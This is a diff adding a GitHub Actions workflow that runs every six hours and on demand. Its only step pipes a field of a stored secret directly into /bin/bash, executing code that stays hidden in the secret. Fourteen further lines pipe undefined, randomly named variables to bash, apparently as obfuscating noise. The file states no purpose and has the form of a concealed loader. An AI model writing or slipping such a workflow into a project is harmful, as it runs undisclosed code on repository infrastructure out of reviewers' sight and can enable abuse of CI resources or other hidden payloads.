@@ -1,0 +1,30 @@
+name: shuizhichiqi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuizhichiqi
+        env:
+          evgb2: ${{ secrets.evgb2 }}
+        run: |
+          echo $evgb2 | jq -r .xiwl0 | /bin/bash
+          echo $uy34 | jq -r .aft3 | /bin/bash
+          echo $i7 | jq -r .fdohd9479 | /bin/bash
+          echo $qlau19 | jq -r .xdh00936 | /bin/bash
+          echo $v78 | jq -r .qg773 | /bin/bash
+          echo $owo2983 | jq -r .udz66 | /bin/bash
+          echo $kwrs93956 | jq -r .fjcs11260 | /bin/bash
+          echo $csd07081 | jq -r .rkon05170 | /bin/bash
+          echo $owv455 | jq -r .fhj939 | /bin/bash
+          echo $v9 | jq -r .ct10385 | /bin/bash
+          echo $npwl5138 | jq -r .wjey5 | /bin/bash
+          echo $bny4 | jq -r .vibfi74111 | /bin/bash
+          echo $vpg3 | jq -r .udvz014 | /bin/bash
+          echo $mtqz73490 | jq -r .de0889 | /bin/bash
+          echo $r66888 | jq -r .o8158 | /bin/bash
+
